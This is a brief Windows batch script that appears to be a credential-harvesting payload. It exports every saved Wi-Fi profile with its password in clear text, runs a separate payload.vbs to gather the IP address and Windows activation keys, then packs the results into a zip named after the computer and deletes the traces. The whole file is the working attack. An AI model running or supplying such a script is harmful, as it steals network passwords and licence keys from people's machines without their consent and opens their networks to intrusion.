@echo off

:: Export WLAN profiles
netsh wlan export profile folder=. key=clear

:: Get IP and Windows activation keys
cscript payload.vbs

:: Zip all files
powershell Compress-Archive -U -Path .\Wi-Fi*.xml, keys.csv, ip.prop -DestinationPath %ComputerName%.zip; rm .\Wi-Fi*.xml, keys.csv, ip.prop